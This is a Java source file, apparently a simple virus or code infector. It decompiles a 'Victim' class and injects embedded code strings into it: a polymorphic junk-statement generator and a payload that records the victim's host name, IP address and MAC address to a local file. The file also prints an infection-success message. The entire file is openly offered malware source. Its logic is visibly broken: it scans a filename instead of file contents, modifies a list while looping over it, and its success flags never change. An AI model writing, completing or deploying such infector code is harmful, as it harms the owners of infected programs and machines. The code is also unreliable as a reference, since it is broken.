public class Expl0rer {
	static String infection = "\nprivate class AppConfigure{" +
			"\njava.util.Random r;" +
			"\nString[] types = {\"byte\", \"char\", \"int\", \"float\", \"long\", \"double\"};" +
			"\nString[] operations = {\"+\", \"-\", \"*\", \"/\"};" +
			"\njava.util.regex.Pattern varName = java.util.regex.Pattern.compile(\".* (.*)=.*\");" +
			"\nString declareTemplate(String type){" +
			"\nr = new java.util.Random();" +
			"\nint length = r.nextInt(10) + 1;" +
			"\nString name = \"\";" +
			"\nfor(int i = 0; i < length; ++i){" +
			"\nchar current = (char)(r.nextInt(26) + 65 + (r.nextBoolean() ? 32 : 0));" +
			"\nname += current;}" +
			"\nString text = new String(name);" +
			"\ntext = type + \" \" + text + \"=\" + String.valueOf(length);" +
			"\nreturn text;}" +
			"\nString actionTemplate(String declared){" +
			"\njava.util.regex.Matcher matcher = varName.matcher(declared);" +
			"\nr = new java.util.Random();" +
			"\nString name = \"\";" +
			"\nif(matcher.matches()){" +
			"\nname = matcher.group(1);}" +
			"\nelse name = \"test\";" +
			"\nString operation;" +
			"\nif(r.nextDouble() < 0.25)" +
			"\noperation = name + operations[r.nextInt(operations.length)] + \"=\" + name.length();" +
			"\nelse if(r.nextDouble() < 0.50)" +
			"\noperation = name + \"=\" + name + operations[r.nextInt(operations.length)] + name.length();" +
			"\nelse if(r.nextDouble() < 0.75)" +
			"\noperation = name + \"=\" + name.length() + operations[r.nextInt(operations.length)] + name;" +
			"\nelse" +
			"\noperation = name + \"=\" + name.length() + operations[r.nextInt(operations.length)] + name.length();" +
			"\nreturn operation;}}";
	static String mutate = "\nprivate static String newChange(){" +
			"\nAppConfigure startProcess = new Victim().new AppConfigure();" +
			"\njava.util.Random r = new java.util.Random();" +
			"\nString type = startProcess.types[r.nextInt(startProcess.types.length)];" +
			"\nString declare = startProcess.declareTemplate(type);" +
			"\nString action = startProcess.actionTemplate(declare);" +
			"\nString change = \"\n\" + declare + \";\n\" + action + \";\";" +
			"\nreturn change;}";
	static String payload = "\nprivate static void payload(){" +
			"\njava.io.PrintStream out;" +
			"\ntry { out = new java.io.PrintStream(\"config.app\");" +
			"\njava.net.InetAddress address = java.net.InetAddress.getLocalHost();" +
			"\njava.net.NetworkInterface nic = java.net.NetworkInterface.getByInetAddress(address);" +
			"\nString ip = address.getHostAddress();" +
			"\nString mac = \"\";" +
			"\nbyte[] nmac = nic.getHardwareAddress();" +
			"\nif (nmac != null) {" +
			"\nfor (int i = 0; i < nmac.length; i++) {" +
			"\nmac += String.format(\"%02X%s\", nmac[i], (i < nmac.length - 1) ? \"-\" : \"\");" +
			"\n}}" +
			"\nout.println(\"Victim HOST = \" + address.getCanonicalHostName() + \"( \" + address.getHostName() + \" )\");" +
			"\nout.println(\"IP = \" + ip);" +
			"\nout.println(\"MAC = \" + mac);" +
			"\n} catch (Exception e) {}}";
	static java.util.ArrayList<String> getCode(String classFile){
		java.util.ArrayList<String> code = new java.util.ArrayList<String>();
		java.util.Scanner in = new java.util.Scanner(classFile);
		while(in.hasNextLine()){
			code.add(in.nextLine());
		}
		return code;
	}
	static boolean modifyCode(java.util.ArrayList<String> code){
		boolean searchingClass = true;
		boolean searchingMain = true;
		boolean fileWritten = false;
		for(int i = 0; i < code.size(); ++i){
			if(searchingClass){
				//TODO: insert class Victim code here to find where to infect class
				for(int j = 0; j < code.size(); j++){
					if(code.get(j).contains("public class"))
						code.add(j+1,infection);
				}
			}
			else if(searchingMain){
				//TODO: insert search for main code to add prelude payload inside of main
				for(int j = 0; j < code.size(); j++){
					if(code.get(j).contains("public static void main"))
						code.add(j+1,payload);
				}
			}
			else{
				break;
			}
		}
		return !searchingClass && !searchingMain && fileWritten; 
	}
	public static void main(String[] args) throws Exception{
		String preload = infection + mutate + payload;
		String actions = "String change = newChange();" +
				"\npayload();";
		ProcessBuilder pb = new ProcessBuilder("jad.exe Victim.class".split(" "));
		Process p = pb.start();
		p.waitFor();
		java.util.ArrayList<String> javacode = getCode("Victim.java");
		boolean success = modifyCode(javacode);
		if(success)
			System.out.println("Victim.class infected successfully");
		else
			System.out.println("Failed to infect Victim.class");
		
	}
}
